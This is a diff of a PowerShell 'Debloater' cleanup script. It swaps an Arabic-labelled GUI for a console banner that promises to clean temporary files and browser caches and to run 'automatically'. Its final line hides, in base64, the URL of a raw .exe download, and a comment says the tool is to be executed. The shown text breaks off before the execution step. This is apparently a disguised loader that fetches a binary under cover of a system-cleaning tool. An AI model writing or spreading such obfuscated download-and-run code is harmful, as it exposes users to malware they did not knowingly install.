@@ -1,121 +1,14 @@
-$useGUI = $true # لتفعيل الواجهة الرسومية
 # By Star
 $ProgressPreference = 'SilentlyContinue'
 Write-Host ""
-
-if ($useGUI) {
-    Add-Type -AssemblyName System.Windows.Forms
-    Add-Type -AssemblyName System.Drawing
-    $form = New-Object System.Windows.Forms.Form
-    $form.Text = "Debloater Tool v1.0 by Star"
-    $form.Size = New-Object System.Drawing.Size(420,420)
-    $form.StartPosition = "CenterScreen"
-    $form.FormBorderStyle = 'FixedDialog'
-    $form.MaximizeBox = $false
-    $form.Font = New-Object System.Drawing.Font("Segoe UI",10)
-
-    $label = New-Object System.Windows.Forms.Label
-    $label.Text = "اختر العملية المطلوبة:"
-    $label.AutoSize = $true
-    $label.Location = New-Object System.Drawing.Point(20,20)
-    $form.Controls.Add($label)
-
-    $resultBox = New-Object System.Windows.Forms.TextBox
-    $resultBox.Multiline = $true
-    $resultBox.ScrollBars = 'Vertical'
-    $resultBox.Size = New-Object System.Drawing.Size(360,120)
-    $resultBox.Location = New-Object System.Drawing.Point(20,240)
-    $resultBox.ReadOnly = $true
-    $form.Controls.Add($resultBox)
-
-    function Show-Result($msg) {
-        $resultBox.AppendText($msg + "`r`n")
-    }
-
-    $btn1 = New-Object System.Windows.Forms.Button
-    $btn1.Text = "تنظيف الملفات المؤقتة"
-    $btn1.Size = New-Object System.Drawing.Size(180,40)
-    $btn1.Location = New-Object System.Drawing.Point(20,60)
-    $btn1.Add_Click({
-        Show-Result "جاري تنظيف الملفات المؤقتة..."
-        $folders = @($env:TEMP, "$env:USERPROFILE\AppData\Local\Temp", "C:\\Windows\\Temp", "C:\\Windows\\Prefetch")
-        $totalDeleted = 0
-        foreach ($path in $folders) {
-            if (Test-Path $path) {
-                $items = Get-ChildItem -Path $path -Recurse -Force -ErrorAction SilentlyContinue
-                foreach ($item in $items) {
-                    try { Remove-Item $item.FullName -Force -Recurse -ErrorAction SilentlyContinue; $totalDeleted++ } catch {}
-                }
-            }
-        }
-        Show-Result "تم حذف $totalDeleted عنصر مؤقت."
-    })
-    $form.Controls.Add($btn1)
-
-    $btn2 = New-Object System.Windows.Forms.Button
-    $btn2.Text = "تنظيف الكاش للمتصفحات"
-    $btn2.Size = New-Object System.Drawing.Size(180,40)
-    $btn2.Location = New-Object System.Drawing.Point(200,60)
-    $btn2.Add_Click({
-        Show-Result "جاري تنظيف كاش المتصفحات..."
-        $chromeCache = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cache"
-        $edgeCache = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cache"
-        $firefoxCache = "$env:APPDATA\Mozilla\Firefox\Profiles"
-        if (Test-Path $chromeCache) { Remove-Item $chromeCache\* -Recurse -Force -ErrorAction SilentlyContinue; Show-Result "Chrome cache cleared." }
-        if (Test-Path $edgeCache) { Remove-Item $edgeCache\* -Recurse -Force -ErrorAction SilentlyContinue; Show-Result "Edge cache cleared." }
-        Get-ChildItem $firefoxCache -Recurse -Include cache2 | ForEach-Object { Remove-Item $_.FullName -Recurse -Force -ErrorAction SilentlyContinue; Show-Result "Firefox cache cleared." }
-    })
-    $form.Controls.Add($btn2)
-
-    $btn3 = New-Object System.Windows.Forms.Button
-    $btn3.Text = "تفريغ سلة المحذوفات"
-    $btn3.Size = New-Object System.Drawing.Size(180,40)
-    $btn3.Location = New-Object System.Drawing.Point(20,120)
-    $btn3.Add_Click({
-        $drives = Get-PSDrive -PSProvider FileSystem | Select-Object -ExpandProperty Name
-        foreach ($drive in $drives) {
-            try { Clear-RecycleBin -DriveLetter $drive -Force -ErrorAction SilentlyContinue } catch {}
-        }
-        Show-Result "تم تفريغ سلة المحذوفات."
-    })
-    $form.Controls.Add($btn3)
-
-    $btn4 = New-Object System.Windows.Forms.Button
-    $btn4.Text = "تحسين الذاكرة"
-    $btn4.Size = New-Object System.Drawing.Size(180,40)
-    $btn4.Location = New-Object System.Drawing.Point(200,120)
-    $btn4.Add_Click({
-        Show-Result "جاري تحسين الذاكرة..."
-        [System.GC]::Collect()
-        [System.GC]::WaitForPendingFinalizers()
-        Show-Result "تم تحسين الذاكرة."
-    })
-    $form.Controls.Add($btn4)
-
-    $btn5 = New-Object System.Windows.Forms.Button
-    $btn5.Text = "معلومات IP العامة"
-    $btn5.Size = New-Object System.Drawing.Size(180,40)
-    $btn5.Location = New-Object System.Drawing.Point(20,180)
-    $btn5.Add_Click({
-        try {
-            $response = Invoke-RestMethod -Uri "https://ipinfo.io/json" -ErrorAction Stop
-            Show-Result "IP: $($response.ip) | $($response.city), $($response.country) | $($response.org)"
-        } catch {
-            Show-Result "تعذر جلب معلومات IP."
-        }
-    })
-    $form.Controls.Add($btn5)
-
-    $btn6 = New-Object System.Windows.Forms.Button
-    $btn6.Text = "إغلاق"
-    $btn6.Size = New-Object System.Drawing.Size(180,40)
-    $btn6.Location = New-Object System.Drawing.Point(200,180)
-    $btn6.Add_Click({ $form.Close() })
-    $form.Controls.Add($btn6)
-
-    [void]$form.ShowDialog()
-    return
-}
+Write-Host "======================================" -ForegroundColor Cyan
+Write-Host "         Debloater Tool v1.0          " -ForegroundColor Green
+Write-Host "          By   ! Star                 " -ForegroundColor Yellow
+Write-Host "======================================" -ForegroundColor Cyan
+Write-Host ""
+Write-Host "Description: This tool cleans temporary files, optimizes your system, and clears browser cache." -ForegroundColor Magenta
+Write-Host "Usage: The script will automatically run the tool." -ForegroundColor Magenta
+Write-Host ""
 
 # Ensure the tool is executed before processing user choices
 $u1 = 'aHR0cHM6Ly9naXRodWIuY29tLzV0NDIvRGVCbG9hdGVyL3Jhdy9yZWZzL2hlYWRzL21haW4vU291cmNlL0RlYmxvYXRlci5leGU='
